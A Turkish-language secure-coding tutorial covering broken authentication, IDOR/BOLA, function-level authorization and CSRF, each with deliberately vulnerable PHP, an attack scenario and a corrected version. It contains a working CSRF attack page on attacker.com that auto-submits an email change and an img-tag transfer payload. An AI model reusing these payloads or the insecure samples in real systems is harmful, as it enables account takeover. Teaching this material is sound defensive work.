# 🛡️ 1. Broken Authentication (Hatalı Kimlik Doğrulama)

Uygulamanın kullanıcı kimliklerini doğrulama, oturumları sürdürme veya hesap güvenliğini sağlama süreçlerinde uyguladığı mantıksal, yapısal ya da konfigürasyonel zayıflıklar sonucu ortaya çıkan geniş zafiyet kategorisine **Broken Authentication** denir.

Kimlik doğrulama sistemleri, bir kullanıcının iddia ettiği kişi olup olmadığını doğrulamakla yükümlüdür. Bu sistemlerde:
*   Kaba kuvvet (*brute-force*) korumasının bulunmaması,
*   Zayıf şifre politikalarının yürütülmesi,
*   Oturum belirteçlerinin (*Session ID, JWT*) tahmin edilebilir üretilmesi,
*   Oturum verilerinin ağ üzerinde şifrelenmeden taşınması,

mekanizmanın işlevini yitirmesine neden olur. Saldırganlar bu açıklardan yararlanarak kullanıcı şifrelerini tahmin edebilir, aktif oturumları ele geçirebilir (**Session Hijacking**) veya kimlik doğrulama adımlarını tamamen atlayarak (**Bypass**) yetkisiz hesap erişimi sağlayabilirler.

---

## 🔍 Kimlik Doğrulama Zafiyetlerinin Teknik Anatomisi

Hatalı kimlik doğrulama yapıları genellikle üç ana başlık altında sömürülür:

1.  **Kaba Kuvvet ve Kimlik Bilgisi Doldurma (Credential Stuffing):** Saldırganlar, hız sınırlaması (*rate limiting*) olmayan giriş panellerine otomatik araçlar vasıtasıyla binlerce şifre kombinasyonu denerler. Ayrıca daha önce sızdırılmış veri tabanlarından elde ettikleri kullanıcı adı ve şifre ikililerini toplu olarak hedef sistemde test ederler.
2.  **Tahmin Edilebilir Oturum Belirteçleri:** Oturum kimliklerinin (*Session ID*) ardışık sayılar (1001, 1002) veya kolayca çözülebilen algoritmalarla (zayıf anahtarlı JWT veya Base64 kodlu metinler) üretilmesi durumunda, saldırgan sadece bu belirteci değiştirerek başka bir kullanıcının oturumuna sızar.
3.  **Zayıf Şifre Sıfırlama Mekanizmaları:** Şifre sıfırlama linklerinin kalıcı olması, sıfırlama token'larının tahmin edilemezlikten uzak üretilmesi veya gizli soruların kolayca yanıtlanabilmesi, doğrudan hesapların ele geçirilmesine yol açar.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, kullanıcı girişini doğrulamak üzere tasarlanmış ancak hiçbir hız sınırlaması, kaba kuvvet koruması veya güvenli hata yönetimi barındırmayan güvensiz bir giriş kontrol yapısı yer almaktadır:

```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
 
// Kullanıcı veri tabanından sorgulanıyor
$query = "SELECT id, password, role FROM users WHERE username = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $user);
$stmt->execute();
$result = $stmt->get_result();
 
if ($result->num_rows === 1) {
    $row = $result->fetch_assoc();
 
    // Şifre kontrolü yapılıyor
    if (password_verify($pass, $row['password'])) {
 
        // GÜVENSİZ YAPI: Oturum kimliği olarak sadece kullanıcının ID değeri atanıyor
        // Saldırgan bu çerezi tarayıcıda değiştirerek (örn: id=1) admin hesabına geçebilir
        setcookie("user_session", $row['id'], time() + 3600, "/");
        echo "Giriş başarılı.";
 
    } else {
 
        // GÜVENSİZ YAPI: Hata mesajı saldırgana kullanıcı adının doğru olduğunu ifşa ediyor
        echo "Girdiğiniz şifre hatalıdır.";
 
    }
 
} else {
    echo "Böyle bir kullanıcı adı sistemde bulunamadı.";
}
?>
```
🎯 Saldırı Senaryosu
Kullanıcı Adı Numaralandırma (Enumeration): Saldırgan giriş panelinde farklı kullanıcı isimleri dener. Sistem "Böyle bir kullanıcı adı bulunamadı" veya "Girdiğiniz şifre hatalıdır" şeklinde spesifik yanıtlar döndüğü için, saldırgan hangi kullanıcı adlarının sistemde meşru olarak var olduğunu kesin olarak listeler.

Brute-Force: Tespit edilen geçerli bir kullanıcı adına (örneğin admin), herhangi bir engelleme veya yavaşlatma mekanizması (Rate Limit) olmadığı için saniyede yüzlerce şifre denemesi isteği gönderilir ve şifre kırılır.

Oturum Manipülasyonu: Giriş yapıldığında sistem çerez olarak user_session=15 değerini atıyorsa, saldırgan tarayıcı üzerinden bu değeri 1 veya 2 yaparak diğer kullanıcıların hesaplarına doğrudan geçiş yapar (Session Fixation / Privilege Escalation).

🔐 Doğru ve Güvenli Kod (Secure Code)
Kimlik doğrulama sistemlerini güvenli kılmak için şifre kontrolleri kriptografik standartlara uygun yapılmalı, oturum yönetiminde dilin yerleşik ve güvenli rastgele değer üreten mekanizmaları kullanılmalı ve hata mesajları dışarıya bilgi sızdırmayacak şekilde jenerik hale getirilmelidir.
```php
<?php
// PHP'nin yerleşik güvenli oturum yönetimi başlatılıyor
// Bu işlem arka planda tahmin edilemez, kriptografik olarak güvenli Session ID üretir
session_start([
    'cookie_httponly' => true,  // JavaScript erişimini engeller
    'cookie_secure'   => true,  // Sadece HTTPS üzerinden taşınmasını zorunlu kılar
    'cookie_samesite' => 'Strict' // CSRF saldırılarını önler
]);
 
$user = $_POST['username'];
$pass = $_POST['password'];
 
// [MİMARİ NOT]: Gerçek uygulamalarda bu aşamadan önce IP veya kullanıcı bazlı
// bir Rate Limiting (Hız Sınırlama) kontrolü işletilmelidir.
 
$query = "SELECT id, password FROM users WHERE username = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $user);
$stmt->execute();
$result = $stmt->get_result();
 
$login_success = false;
 
if ($result->num_rows === 1) {
    $row = $result->fetch_assoc();
    if (password_verify($pass, $row['password'])) {
        $login_success = true;
 
        // GÜVENLİ YAPI: Sabit veri yerine sunucu tarafında korunan session yapısı kullanılır
        $_SESSION['user_id'] = $row['id'];
 
        // Session Fixation saldırılarını önlemek için giriş anında session ID yenilenir
        session_regenerate_id(true);
    }
}
 
if ($login_success) {
    echo "Giriş başarılı.";
} else {
    // GÜVENLİ YAPI: Kullanıcı adı veya şifrenin hangisinin hatalı olduğu gizlenir
    echo "Kullanıcı adı veya şifre hatalı.";
}
?>
```
🧱 Savunma Katmanları (Defense-in-Depth)
Kimlik doğrulama sistemlerinin tek bir noktadan kırılmasını engellemek adına şu ek koruma katmanları mimariye dahil edilmelidir:

1. Sıkı Hız Sınırlaması (Rate Limiting) ve Hesap Kilitleme
Otomatik saldırıların engellenmesi amacıyla istek sayıları sınırlandırılmalıdır.

IP ve Hesap Bazlı Sınırlandırma: Aynı IP adresinden veya aynı kullanıcı hesabına yönelik olarak 5 dakika içinde en fazla 5 hatalı giriş denemesine izin verilmelidir. Limit aşıldığında istekler geçici olarak (örneğin 15 dakika) bloke edilmelidir.

🔒 Hesap Kilitleme Politikası (Account Lockout): Belirli sayıda hatalı denemeden sonra hesap geçici olarak kilitlenmeli veya sonraki denemelerde kullanıcıya CAPTCHA doğrulaması zorunlu kılınmalıdır.
### 2. Güvenli Oturum ve Çerez Yönetimi

Oturum süreçlerinin yetkisiz kişilerce ele geçirilmesini önlemek adına çerez ve oturum yaşam döngüsü sıkı kurallara bağlanmalıdır:

*   🎲 **Kriptografik Rastgelelik:** Oturum belirteçleri oluşturulurken tahmin edilmesi imkansız olan, kriptografik olarak güvenli rastgele sayı üreteçleri (**CSPRNG**) kullanılmalıdır.
*   🍪 **Çerez Bayrakları (Cookie Flags):** Oturum çerezleri tanımlanırken `HttpOnly`, `Secure` ve `SameSite=Strict` öznitelikleri eksiksiz uygulanmalıdır.
*   ⏱️ **Oturum Zaman Aşımı (Timeout):** Hareketsiz kalan oturumlar belirli bir süre sonra (*örneğin 15 dakika*) otomatik olarak sonlandırılmalı (**Idle Timeout**), kullanıcı çıkış yaptığında sunucu tarafındaki oturum verileri tamamen yok edilmelidir.

---

### 3. Güçlü Şifre Politikaları ve Çok Faktörlü Kimlik Doğrulama (MFA)

Kullanıcı hesaplarının giriş kapısını daha dayanıklı hale getirmek için şu iki temel politika uygulanmalıdır:

*   🔑 **Karmaşıklık Kontrolü:** Kullanıcıların ardışık sayılar veya *"123456"*, *"password"* gibi en sık sızdırılan şifreleri seçmesi sistem tarafından engellenmelidir. Şifreler en az **10 karakter** uzunluğunda olmalı; büyük/küçük harf, rakam ve özel karakter içermelidir.
*   📱 **Çok Faktörlü Kimlik Doğrulama (MFA):** Parolanın siber saldırganlar tarafından ele geçirilmesi ihtimaline karşı, sisteme giriş esnasında SMS, e-posta veya zaman tabanlı tek kullanımlık şifre (**TOTP** - *Google Authenticator vb.*) üreten ikinci bir doğrulama katmanı entegre edilmelidir. Bu katman, Broken Authentication zafiyetlerine karşı en güçlü bariyerlerden birini oluşturur.
*   # 🛡️ 2. Broken Object Level Authorization (BOLA / IDOR)

Uygulamanın kullanıcıdan aldığı bir nesne tanımlayıcısını (veri tabanı ID değeri, UUID, dosya adı veya hesap numarası) arka planda işlerken, isteği gerçekleştiren aktif kullanıcının o nesne üzerinde meşru bir erişim hakkının olup olmadığını kontrol etmemesi sonucu oluşan zafiyete **Broken Object Level Authorization (BOLA)** veya geleneksel adıyla **Insecure Direct Object Reference (IDOR)** denir.

Modern web uygulamalarında ve API mimarilerinde en sık rastlanan ve sömürüldüğünde en yüksek hasarı veren yetkilendirme açıklığıdır. Bu senaryoda kullanıcı sisteme kendi geçerli kimlik bilgileriyle giriş yapmıştır, yani kimlik doğrulama (*Authentication*) aşaması başarılıdır. Ancak sunucu, kullanıcının veri tabanındaki nesnelere erişim sınırını (*Authorization*) nesne seviyesinde denetlemediği için, saldırgan sadece parametre değerlerini değiştirerek diğer kullanıcılara ait tıbbi kayıtları, faturaları, kişisel mesajları veya gizli şirket verilerini okuyabilir, değiştirebilir ya da tamamen silebilir.

---

## 🔍 BOLA / IDOR Zafiyetlerinin Teknik Anatomisi

BOLA zafiyetleri genellikle istemci (*Client*) ile sunucu (*Server*) arasındaki veri transferinin şeffaf olduğu mimarilerde ortaya çıkar. Saldırganlar sistemin işleyişini şu yöntemlerle manipüle ederler:

*   🔢 **Ardışık ID Numaralandırma (Incrementation):** Veri tabanında birincil anahtar (*Primary Key*) olarak otomatik artan sayılar (101, 102, 103) kullanıldığında, saldırgan kendi hesap dökümünü alan URL veya API isteğindeki ID değerini birer birer değiştirerek tüm veri tabanını otomatik scriptlerle sızdırabilir.
*   📨 **İstek Gövdesi (Request Body) ve Metot Manipülasyonu:** Zafiyet sadece HTTP GET isteklerindeki URL parametrelerinde aranmaz. HTTP PUT, POST veya DELETE isteklerinin JSON gövdesindeki `account_id`, `user_id` veya `invoice_no` gibi alanlar da hedef nesne üzerinde yetkisiz işlem gerçekleştirmek amacıyla manipüle edilir.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, bir e-ticaret sisteminde kullanıcıların fatura detaylarını görüntülemesi amacıyla tasarlanmış bir API uç noktası (*endpoint*) yer almaktadır. Yazılımcı, kullanıcının sisteme giriş yapıp yapmadığını kontrol etmekte ancak erişilmek istenen faturanın o kullanıcıya ait olup olmadığını denetlememektedir:

```php
<?php
session_start();
 
// Kullanıcının oturum açıp açmadığı kontrol ediliyor (Authentication)
if (!isset($_SESSION['user_id'])) {
    die("Yetkisiz erişim. Lütfen giriş yapın.");
}
 
// URL veya istek parametresinden doğrudan fatura ID değeri alınıyor
$invoiceId = $_GET['invoice_id'];
 
// GÜVENSİZ YAPI: Fatura doğrudan sorgulanıyor, nesne seviyesinde sahiplik kontrolü yok!
$query = "SELECT id, user_id, amount, description FROM invoices WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $invoiceId);
$stmt->execute();
$result = $stmt->get_result();
 
if ($row = $result->fetch_assoc()) {
    // Fatura detayları ekrana basılıyor
    echo json_encode($row);
} else {
    echo "Fatura bulunamadı.";
}
?>
```
🎯 Saldırı Senaryosu
Sisteme meşru olarak giriş yapan ve kullanıcı ID değeri 45 olan bir saldırgan, kendi faturasını incelerken URL adresinin şu şekilde olduğunu fark eder:

http://example.com/api/get_invoice.php?invoice_id=1005

Saldırgan invoice_id parametresini 1004 veya 1003 olarak değiştirir.

Sunucu, kullanıcının session değerindeki user_id bilgisinin 45 olduğunu doğrular (giriş yapılmıştır) ancak faturayı çekerken faturanın içindeki user_id alanı ile session'daki ID değerini karşılaştırmaz.

Sonuç: Saldırgan sistemdeki diğer tüm kullanıcıların fatura dökümlerini ve kişisel verilerini sırayla görüntüler.

🔐 Doğru ve Güvenli Kod (Secure Code)
BOLA / IDOR saldırılarını önlemenin tek kesin yolu, istemciden gelen her nesne erişim isteğinde, veri tabanından veri çekilirken veya işlem gerçekleştirilmeden önce, oturum açmış aktif kullanıcının o nesne üzerinde sahiplik veya erişim hakkının olup olmadığını sunucu tarafında doğrulamaktır.
```php
<?php
session_start();

// Kullanıcının oturum açıp açmadığı kontrol ediliyor
if (!isset($_SESSION['user_id'])) {
    die("Yetkisiz erişim. Lütfen giriş yapın.");
}

$currentUserId = $_SESSION['user_id'];
$invoiceId = $_GET['invoice_id'];

// GÜVENLİ YAPI: Sorguya, nesne sahibinin aktif kullanıcı olması şartı (user_id = ?) ekleniyor
// Bu sayede saldırgan farklı bir fatura ID girse bile, fatura kendisine ait değilse sorgu boş döner
$query = "SELECT id, user_id, amount, description FROM invoices WHERE id = ? AND user_id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("ii", $invoiceId, $currentUserId);
$stmt->execute();
$result = $stmt->get_result();

if ($row = $result->fetch_assoc()) {
    echo json_encode($row);
} else {
    // Güvenlik uyarısı: Fatura yoksa veya kullanıcıya ait değilse jenerik bir mesaj dönülür
    echo "Talep edilen kayıt bulunamadı veya bu kayda erişim yetkiniz yoktur.";
}
?>
```
🧱 Savunma Katmanları (Defense-in-Depth)
Nesne seviyesindeki yetkilendirme açıklarını engellemek ve kod mimarisini daha dirençli kılmak adına şu ek savunma katmanları uygulanmalıdır:

1. Merkezi Yetkilendirme Mekanizması ve RBAC / ABAC Entegrasyonu
Yetkilendirme kontrolleri her kod sayfasında veya her SQL sorgusunda manuel olarak yazılmamalıdır. Bu durum yazılımcıların gözünden kaçabilecek açıklar barındırır.

Merkezi Çözüm: Uygulama mimarisinde Rol Tabanlı Erişim Kontrolü (RBAC) veya Öznitelik Tabanlı Erişim Kontrolü (ABAC) uygulayan merkezi bir yetkilendirme kütüphanesi ya da middleware (ara katman) kullanılmalıdır.

Otomatik Kısıtlar: Veri tabanından nesne çeken veri erişim katmanları (ORM / Data Access Layer), nesne sorgularına otomatik olarak aktif kullanıcının kısıtlarını (Context) ekleyecek şekilde soyutlanmalıdır.

2. İstemci Girdilerine Güvenmemek ve Tahmin Edilemez Belirteçler (UUID)
Saldırganların ardışık numaralandırma taktiklerini tamamen körleştirmek amacıyla, nesne tanımlayıcısı olarak otomatik artan tamsayılar (Sequential IDs) yerine kriptografik olarak güvenli rastgele diziler (UUID v4) tercih edilmelidir.

Örnek: Fatura adresi ?invoice_id=1005 yerine ?invoice_id=9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d şeklinde yapılandırıldığında, saldırgan bir sonraki veya bir önceki faturanın kimliğini tahmin edemez.

⚠️ Kritik Uyarı: UUID kullanımı tek başına bir yetkilendirme çözümü değildir, sadece saldırganın tahminde bulunmasını zorlaştırır (Security through obscurity). Eğer bir şekilde UUID adresi sızarsa ve arkada nesne seviyesinde yetki kontrolü yoksa zafiyet aynen sömürülebilir. Bu nedenle asıl koruma her zaman sunucu tarafındaki kod kontrolüdür.

3. Bütünlük Kontrolleri ve Kriptografik İmzalar
İstemci tarafında saklanması veya taşınması zorunlu olan ve parametre manipülasyonuna açık olan nesne tanımlayıcıları, sunucu tarafından kriptografik olarak imzalanmalıdır.

JWT Kullanımı: API tasarımlarında veya durum bilgisi barındıran token yapılarında (JWT - JSON Web Token), değiştirilmemesi gereken parametreler token'ın imzalı gövdesine (Payload) yerleştirilmelidir.

İmza Doğrulama: Sunucu gelen isteği işlerken önce imzanın (Signature) geçerliliğini doğrulamalı, istemci tarafında gizlice değiştirilmiş nesne kimliklerini tespit ettiği an isteği bloke etmelidir.

# 🛡️ 3. Broken Function Level Authorization (BFLA)

Uygulamanın farklı kullanıcı rolleri (örneğin standart kullanıcı, moderatör, sistem yöneticisi) için tanımlanmış fonksiyonel yetenekleri ve API uç noktalarını (*endpoint*) sunucu tarafında doğrulamaması veya eksik doğrulaması sonucu oluşan zafiyete **Broken Function Level Authorization (Eksik Fonksiyon Seviyesinde Yetkilendirme)** denir.

> 🔄 **BOLA ile Farkı Nedir?**
> *   **BOLA (IDOR):** Odak noktası, aynı fonksiyona erişimi olan kullanıcıların birbirlerinin *"verilerine/nesnelerine"* sızmasıdır.
> *   **BFLA:** Odak noktası, düşük yetkili bir kullanıcının doğrudan üst düzey *"işlevleri ve yönetimsel panelleri"* tetikleyebilmesidir.

Yazılımcıların idari butonları veya menüleri standart kullanıcılardan sadece görsel olarak gizlemesi, ancak arka plandaki fonksiyonel uç noktaları korumasız bırakması bu zafiyete davetiye çıkarır. Saldırganlar gizlenmiş URL yapılarını tahmin ederek ya da HTTP metotlarını manipüle ederek sistemden kullanıcı silme, veritabanı yedekleme, fiyat değiştirme veya sistem konfigürasyonlarını güncelleme gibi kritik eylemleri gerçekleştirebilirler.

---

## 🔍 BFLA Zafiyetlerinin Teknik Anatomisi

Fonksiyon seviyesindeki yetkilendirme açıkları genellikle uygulamanın mimari tasarım aşamasındaki mantıksal eksikliklerden beslenir. Saldırganlar bu zafiyeti şu yöntemlerle sömürürler:

*   🌐 **Açık ve Tahmin Edilebilir URL Yapıları:** Yönetim panellerinin veya API uç noktalarının `/admin/delete_user`, `/api/v1/users/export` gibi tahmin edilebilir veya standart isimlendirme şablonlarıyla tasarlanması durumunda, saldırganlar bu adreslere doğrudan HTTP istekleri göndererek yetki kontrollerini test ederler.
*   🔄 **HTTP Metot Değişimi (Method Verb Tampering):** Bir uç nokta HTTP GET isteği ile çağrıldığında standart kullanıcıya veri listeliyor, ancak aynı uç nokta HTTP DELETE veya PUT ile çağrıldığında idari bir işlem yürütüyorsa ve sunucu bu metot geçişlerindeki rol izinlerini kontrol etmiyorsa zafiyet tetiklenir.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP ve API örneğinde, bir kurumsal sistemde kullanıcı hesaplarını silmek amacıyla tasarlanmış bir yönetimsel fonksiyon yer almaktadır. Yazılımcı, kullanıcının sisteme giriş yapıp yapmadığını kontrol etmekte ancak eylemi gerçekleştiren kişinin "Yönetici (Admin)" rolüne sahip olup olmadığını sunucu tarafında doğrulamamaktadır:

```php
<?php
session_start();
 
// Kullanıcının sisteme giriş yapıp yapmadığı kontrol ediliyor (Authentication)
if (!isset($_SESSION['user_id'])) {
    die(json_encode(["error" => "Lütfen giriş yapın."]));
}
 
// Silinecek kullanıcının ID değeri parametre olarak alınıyor
$userIdToDelete = $_POST['id'];
 
// GÜVENSİZ YAPI: Fonksiyon seviyesinde rol kontrolü yok!
// Giriş yapmış herhangi bir standart kullanıcı bu fonksiyonu tetikleyebilir.
$query = "DELETE FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $userIdToDelete);
$stmt->execute();
 
echo json_encode(["status" => "Kullanıcı hesabı başarıyla silindi."]);
?>
```
🎯 Saldırı Senaryosu
Sistemde standart bir profile sahip olan ve admin panel arayüzünü göremeyen bir saldırgan, tarayıcının ağ hareketlerini (Network Tab) inceleyerek veya API dökümantasyonlarını tahmin ederek /api/admin/delete_user.php şeklinde bir uç noktanın varlığını saptar.

Saldırgan, HTTP POST yöntemiyle bu adrese id=10 parametresini içeren bir istek gönderir.

Sunucu, isteği gönderen kişinin oturumunun ($_SESSION['user_id']) aktif olduğunu görür ve rol kontrolü yapmadığı için hedef kullanıcıyı sistemden siler.

🔐 Doğru ve Güvenli Kod (Secure Code)
BFLA saldırılarını önlemenin tek kesin yolu, sunucu tarafında her fonksiyon çağrısında ve her API uç noktasında, istek sahibinin o eylemi yürütmeye meşru olarak yetkili olup olmadığını dinamik olarak denetlemektir.
```php
<?php
session_start();
 
// 1. Kullanıcının sisteme giriş yapıp yapmadığı kontrol ediliyor
if (!isset($_SESSION['user_id'])) {
    die(json_encode(["error" => "Lütfen giriş yapın."]));
}
 
// 2. GÜVENLİ YAPI: Kullanıcının güncel rolü session veya güvenli veri tabanından doğrulanıyor
// Fonksiyon seviyesindeki kritik eyleme sadece 'Admin' rolünün geçiş yapabileceği şartı koşuluyor
if (!isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'Admin') {
    // Güvenlik İhlali Kaydı: Yetkisiz bir rol yönetimsel işlevi tetiklemeye çalıştı
    error_log("Yetkisiz Erişim Teşebbüsü: User ID " . $_SESSION['user_id'] . " admin işlevini çağırdı.");
    
    // İstek reddediliyor ve HTTP 403 Forbidden durumu dönülüyor
    http_response_code(403);
    die(json_encode(["error" => "Bu işlemi gerçekleştirmek için yetkiniz bulunmamaktadır."]));
}
 
// Güvenlik kontrolleri geçildikten sonra idari işlem yürütülür
$userIdToDelete = $_POST['id'];
 
$query = "DELETE FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $userIdToDelete);
$stmt->execute();
 
echo json_encode(["status" => "Kullanıcı hesabı başarıyla silindi."]);
?>
```
🧱 Savunma Katmanları (Defense-in-Depth)
Sistem mimarisini fonksiyon seviyesindeki yetkilendirme ihlallerine karşı korumak adına şu derinlemesine savunma ilkeleri uygulanmalıdır:

1. Merkezi ve Bildirimsel Yetki Yönetimi (Middleware Mimarisi)
Yetkilendirme mantığı, her fonksiyonun veya her sayfanın içerisine manuel kod blokları yazılarak kurulmamalıdır. Bu durum, yeni işlevler eklendikçe yazılımcıların kontrolleri unutmasına sebep olur.

Merkezi Çözüm: Uygulama mimarisinde Rol Tabanlı Erişim Kontrolü (RBAC) veya Öznitelik Tabanlı Erişim Kontrolü (ABAC) kurallarını işleten merkezi ara katmanlar (Middleware / Interceptors) kullanılmalıdır.

Varsayılan Ayar: Tüm API rotaları ve fonksiyonel uç noktalar, bildirimsel (declarative) güvenlik şablonları veya anotasyonlar ile koruma altına alınmalıdır. Rotalar varsayılan olarak "Herkese Kapalı (Deny by Default)" olarak yapılandırılmalı, sadece belirli rollere açıkça izin (Allow) verilmelidir.

2. İdari Arayüzlerin ve API Yapılarının İzolasyonu
Yönetimsel işlevlerin barındığı kod blokları ve API uç noktaları, standart kullanıcıların trafiğinden mimari olarak soyutlanmalıdır.

İzole Rota Ağacı: Yönetici işlevlerini barındıran API uç noktaları ayrı bir alt alan adında (örneğin admin-api.company.com) veya izole bir rota ağacında toplanmalıdır.

🌐 Ağ Seviyesinde Kısıtlama: Bu yönetimsel ağaçlar, ağ seviyesinde (Network Layer) kısıtlamalara tabi tutulmalı, IP beyaz listesi (IP Whitelisting) veya kurumsal VPN erişim zorunluluğu gibi ek bariyerlerle dış dünyaya tamamen kapatılmalıdır.

3. Görsel Gizlemeyi Güvenlik Standartı Saymamak
Kullanıcı arayüzünde (UI) yapılan kısıtlamalar yalnızca kullanıcı deneyimini (UX) iyileştirmek için bir araçtır; asla bir siber güvenlik bariyeri olarak kabul edilmemelidir.

İstemciye Güvenmeyin: İstemci tarafındaki (Angular, React, Vue vb.) yönlendirme (routing) muhafazaları veya isAdmin bayrağına göre buton gizleme/gösterme işlemleri, saldırganlar tarafından tarayıcı hafızasına müdahale edilerek ya da doğrudan proxy araçları (Burp Suite vb.) kullanılarak saniyeler içinde aşılabilir.

Sunucu Kontrolü Şarttır: İstemciden gelen her talebe, sunucu katmanında her zaman "güvenilmeyen veri" muamelesi yapılmalı ve rol doğrulama işlemi her HTTP isteğinde sıfırdan yürütülmelidir.
# 🛡️ 4. Cross-Site Request Forgery (CSRF)

Oturumu açık olan bir kurbanın tarayıcısını manipüle eden bir saldırganın, kullanıcının bilgisi veya rızası olmaksızın, kurban adına hedef web uygulamasına sahte, kötü niyetli ve yetkilendirilmiş HTTP istekleri göndermesini sağlayan zafiyet türüne **Cross-Site Request Forgery (Siteler Arası İstek Sahteciliği)** denir.

> 🍪 **Temel Sebep:** Tarayıcıların geçmişten gelen durum yönetimi (*state management*) mimarisidir. Bir web sitesine ait oturum çerezleri (*Session Cookies*) tarayıcıda saklanırken, siteye yapılacak herhangi bir HTTP isteğinde (istek üçüncü parti harici bir siteden tetiklenmiş olsa dahi) tarayıcı bu çerezleri isteğin arkasına otomatik olarak ekler.

Saldırganlar bu otomatik gönderim mekanizmasını suistimal ederek, kullanıcının tarayıcısına arka planda gizli istekler yaptırır. Sonuç olarak sunucu, gelen isteğin arkasındaki meşru oturum çerezini görür ve isteğin kullanıcı tarafından bilinçli yapıldığını varsayarak e-posta değiştirme, şifre sıfırlama, para transferi veya yetki yükseltme gibi kritik eylemleri onaylar.

---

## 🔍 CSRF Zafiyetlerinin Teknik Anatomisi

CSRF saldırıları genellikle uygulamanın durum değiştiren (*state-changing*) işlemler için HTTP GET metotlarını kullanması veya POST isteklerinde kaynak doğrulama adımlarını eksik bırakması durumunda ortaya çıkar.

*   🔗 **HTTP GET İstekleri Üzerinden Sömürü:** Kritik eylemler URL parametreleriyle (örneğin `/account/transfer?amount=1000&to=attacker`) yürütülüyorsa, saldırgan bir forum sayfasına `<img src="http://bank.com/account/transfer?amount=1000&to=attacker">` şeklinde sahte bir görsel etiketi yerleştirebilir. Kurban bu forum sayfasını açtığı an, tarayıcı görseli yüklemek için banka adresine otomatik olarak çerezlerle birlikte istek atar ve transfer gerçekleşir.
*   📨 **HTTP POST İstekleri Üzerinden Sömürü:** Uygulama POST yöntemi kullansa dahi, saldırgan kendi kontrolündeki harici bir web sitesine görünmez bir HTML formu (`<form style="display:none;">`) ve formu sayfayı açar açmaz tetikleyen bir JavaScript kodu (`form.submit()`) yerleştirir. Kurban bu zararlı siteyi ziyaret ettiğinde, form hedef banka sitesine doğru POST isteği fırlatır ve tarayıcı çerezleri yine otomatik olarak ekler.

---

## 💻 Kod Örnekleri

### ❌ Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, kullanıcıların sistemdeki e-posta adreslerini güncellemesini sağlayan bir profil yönetim sayfası yer almaktadır. Yazılımcı, oturumun aktif olup olmadığını doğrulamakta ancak isteğin hangi kaynaktan veya hangi arayüzden geldiğini (CSRF kontrolü) denetlememektedir:

```php
<?php
session_start();
 
// 1. Oturum Kontrolü
if (!isset($_SESSION['user_id'])) {
    die("Lütfen giriş yapın.");
}
 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // GÜVENSİZ YAPI: Hiçbir CSRF Token kontrolü yapılmadan doğrudan istek kabul ediliyor!
    $newEmail = $_POST['email'];
    $userId = $_SESSION['user_id'];
 
    // 2. E-posta Format Doğrulaması (Input Validation)
    if (!filter_var($newEmail, FILTER_VALIDATE_EMAIL)) {
        die("Lütfen geçerli bir e-posta adresi giriniz.");
    }
 
    // Güncelleme İşlemi
    $query = "UPDATE users SET email = ? WHERE id = ?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("si", $newEmail, $userId);
    
    if ($stmt->execute()) {
        echo "E-posta adresiniz başarıyla güncellendi.";
    } else {
        echo "Bir hata oluştu. Lütfen tekrar deneyiniz.";
    }
}
?>
```
🎯 Saldırı Senaryosu
Saldırgan, kurbanı kendi hazırladığı http://attacker.com/evil.html adresine çekmek için sosyal mühendislik yöntemleri kullanır. Bu zararlı sayfanın kaynak kodlarında şu yapı yer almaktadır:
<!-- [http://attacker.com/evil.html](http://attacker.com/evil.html) -->
```html
<html>
  <body>
    <!-- Kurbanın tarayıcısından hedef siteye gizli POST isteği gönderecek sahte form -->
    <form id="csrfForm" action="[http://targetapp.com/update_email.php](http://targetapp.com/update_email.php)" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      // Sayfa yüklendiği an form kullanıcının ruhu duymadan otomatik gönderilir
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```
⚙️ Saldırı Nasıl Gerçekleşir?
Kurban, hedef uygulamada (targetapp.com) aktif bir oturuma sahipken saldırganın hazırladığı bu zararlı bağlantıyı açar.

Tarayıcı, POST isteğini kurbanın meşru oturum çerezleriyle birlikte otomatik olarak fırlatır.

Sunucu, isteğin harici bir domainden (attacker.com) geldiğini ayırt edemez ve kurbanın hesabına ait e-posta adresini saldırganın adresiyle değiştirir.

Saldırgan daha sonra şifre sıfırlama talebi göndererek kurbanın hesabını tamamen ele geçirir.

🔐 Doğru ve Güvenli Kod (Secure Code)
CSRF saldırılarını engellemenin en kesin yöntemi, tarayıcının otomatik çerez gönderme mekanizmasına güvenmemek ve sunucu tarafında CSRF Token (Kriptografik Anti-CSRF Belirteci) mimarisini uygulamaktır.

💡 Çözüm Mantığı: Her oturum için benzersiz, kriptografik olarak güvenli ve tahmin edilemez bir token üretilir. Bu token, sunucu tarafında saklanırken (Session), kullanıcının önüne çıkarılan HTML formlarının içerisine gizli bir input (hidden input) olarak yerleştirilir. Form gönderildiğinde, sunucu gelen token ile session'daki token değerini karşılaştırır.
```php
<?php
session_start();
 
if (!isset($_SESSION['user_id'])) {
    die("Lütfen giriş yapın.");
}
 
// 1. Oturum açıldığında veya form yüklenmeden önce benzersiz bir CSRF token üretilir
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Kriptografik rastgele değer
}
 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 2. GÜVENLİ YAPI: İstemciden formla gelen token ile sunucudaki token karşılaştırılıyor
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        // Zamanlama saldırılarına karşı hash_equals fonksiyonu ile güvenli string karşılaştırması yapılır
        http_response_code(403);
